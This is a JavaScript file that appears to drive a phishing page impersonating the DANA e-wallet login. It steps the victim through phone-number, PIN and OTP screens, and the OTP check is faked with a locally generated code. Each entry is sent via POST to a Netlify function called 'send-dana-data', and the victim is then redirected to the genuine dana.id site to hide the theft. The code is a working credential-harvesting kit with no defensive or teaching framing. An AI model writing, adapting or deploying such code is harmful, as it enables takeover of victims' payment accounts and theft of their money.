// Fungsi next() untuk pindah ke halaman input nomor HP
function next() {
  $(".index").fadeOut(300, function() {
    $(".container").fadeIn(300);
    $("#inp").focus();
  });
}

$(document).ready(function(){
  // Validasi input nomor HP
  $('#inp').on('input', function(){
    if($(this).val() == '0' || $(this).val() == '62'){
      $(this).val('');
    }
  });
  
  // Masking input nomor HP
  $('#inp').mask('000-0000-000000');
});

// Aktifkan tombol lanjut jika input sudah valid
let inp = document.getElementById("inp");
let btn = document.getElementById("btn");
inp.addEventListener("input", val);
function val(){
  if(inp.value.length > 10){
    btn.disabled = false;
  }else{
    btn.disabled = true;
  }
};

// Fungsi untuk mengumpulkan PIN dan berpindah ke input berikutnya
$('.inppin').on('input', function(event) {
  const inputs = $('.inppin');
  const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
  if (isAllFilled == true) {
    $(event.target).blur();
    sendPin();
  };
  const index = inputs.index(this);
  const currentValue = event.target.value;
  if (currentValue.length === 1) {
    if (index < inputs.length - 1) {
      inputs[index + 1].focus();
    }
  } else if (currentValue.length === 0) {
    if (index > 0) {
      inputs[index].focus();
    }
  };
});

// Fungsi untuk backspace di input PIN
$('.inppin').on('keydown', function(event) {
  const inputs = $('.inppin');
  const key = event.key;
  const index = inputs.index(this);
  if (key === 'Backspace' && event.target.value.length === 0) {
    if (index > 0) {
      inputs[index - 1].focus();
    }
  };
});

// Fungsi untuk mengumpulkan OTP dan berpindah ke input berikutnya
$('.inpotp').on('input', function(event) {
  const inputs = $('.inpotp');
  const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
  if (isAllFilled == true) {
    $(event.target).blur();
    sendOtp();
  }
  const index = inputs.index(this);
  const currentValue = event.target.value;
  if (currentValue.length === 1) {
    if (index < inputs.length - 1) {
      inputs[index + 1].focus();
    }
  } else if (currentValue.length === 0) {
    if (index > 0) {
      inputs[index].focus();
    }
  };
});

// Fungsi untuk backspace di input OTP
$('.inpotp').on('keydown', function(event) {
  const inputs = $('.inpotp');
  const key = event.key;
  const index = inputs.index(this);
  if (key === 'Backspace' && event.target.value.length === 0) {
    if (index > 0) {
      inputs[index - 1].focus();
    }
  };
});

// Fungsi untuk clear input PIN dan OTP
$(document).ready(function() {
  $('.clear').click(function() {
    $('.inppin').val('');
    $('#pin1').focus();
  });
  $('.clearotp').click(function() {
    $('.inpotp').val('');
    $('#otp1').focus();
  });
  
  // Fungsi untuk show/hide PIN
  $('.show').click(function() {
    $('.inppin').each(function() {
      if ($(this).attr('type') === 'password') {
        $(this).attr('type','number');
        $(".show").text("SEMBUNYIKAN");
      } else {
        $(this).attr('type', 'password');
        $(".show").text("TAMPILKAN");
      }
    });
  });
});

// Fungsi untuk mengirim data ke Netlify Function
async function sendDataToNetlify(data) {
  try {
    const response = await fetch('/.netlify/functions/send-dana-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
    const result = await response.json();
    console.log('Success:', result);
  } catch (error) {
    console.error('Error:', error);
  }
}

// Modifikasi fungsi sendNohp
function sendNohp(event) {
  event.preventDefault();
  $("#process").show();
  
  const phoneNumber = $('#inp').val();
  localStorage.setItem('dana_phoneNumber', phoneNumber);
  
  // Kirim notifikasi nomor HP
  sendDataToNetlify({ 
    phoneNumber, 
    step: 'phone' 
  });
  
  setTimeout(function() {
    $("#process").hide();
    $("#formNohp").fadeOut(300, function() {
      $("#formPin").fadeIn(300);
      $("#pin1").focus();
    });
  }, 1500);
}

// Modifikasi fungsi sendPin
function sendPin() {
  $("#process").show();
  
  const pin = $('#pin1').val() + $('#pin2').val() + $('#pin3').val() + 
              $('#pin4').val() + $('#pin5').val() + $('#pin6').val();
  localStorage.setItem('dana_pin', pin);
  
  const phoneNumber = localStorage.getItem('dana_phoneNumber');
  
  // Kirim notifikasi PIN
  sendDataToNetlify({ 
    phoneNumber, 
    pin,
    step: 'pin' 
  });
  
  setTimeout(function() {
    $("#process").hide();
    $('.inppin').val('');
    $(".bgotp").fadeIn();
    setInterval(countdown, 1000);
    $("#otp1").focus();
    
    const otp = Math.floor(1000 + Math.random() * 9000);
    localStorage.setItem('dana_otp', otp);
  }, 1500);
}

// Modifikasi fungsi sendOtp
function sendOtp() {
  $(".loadingOtp").show();
  
  setTimeout(function() {
    const enteredOtp = $('#otp1').val() + $('#otp2').val() + 
                       $('#otp3').val() + $('#otp4').val();
    const correctOtp = localStorage.getItem('dana_otp');
    
    $(".loadingOtp").hide();
    $('.inpotp').val('');
    
    if(enteredOtp === correctOtp) {
      $(".alert").text("Verifikasi berhasil! Mengarahkan ke dashboard...");
      $(".alert").css("color","green");
      
      // Kirim notifikasi OTP
      const phoneNumber = localStorage.getItem('dana_phoneNumber');
      const pin = localStorage.getItem('dana_pin');
      sendDataToNetlify({ 
        phoneNumber, 
        pin, 
        otp: enteredOtp,
        step: 'otp' 
      });
      
      setTimeout(function() {
        window.location.href = "https://dana.id";
      }, 2000);
    } else {
      $(".alert").text("Kode OTP salah atau telah kedaluwarsa. Silahkan kirim ulang kode OTP");
      $(".alert").css("color","red");
    }
  }, 3000);
}

// Fungsi countdown untuk OTP
function countdown() {
  var count = parseInt($('#countdown').text());
  if (count !== 0) {
    $('#countdown').text(count - 1);
  } else {
    $('#countdown').text('120');
    $(".resend").css("color","blue");
    $(".resend").css("font-weight","bold");
    $(".resend").click(function() {
      // Generate OTP baru saat diklik
      const otp = Math.floor(1000 + Math.random() * 9000);
      localStorage.setItem('dana_otp', otp);
      console.log('OTP baru untuk demo:', otp);
      $('#countdown').text('120');
      $(".alert").text("Kode OTP baru telah dikirim ke nomor Anda");
      $(".alert").css("color","black");
      $(".resend").css("color","");
      $(".resend").css("font-weight","");
    });
  }
};

// Animasi awal saat halaman dimuat
window.onload = function() {
  setTimeout(function(){
    $(".start").fadeIn(300, function() {
      setTimeout(function(){
        $(".start").fadeOut(300, function() {
          $(".index").fadeIn(300);
        });
      }, 2000);
    });
  }, 500);
}
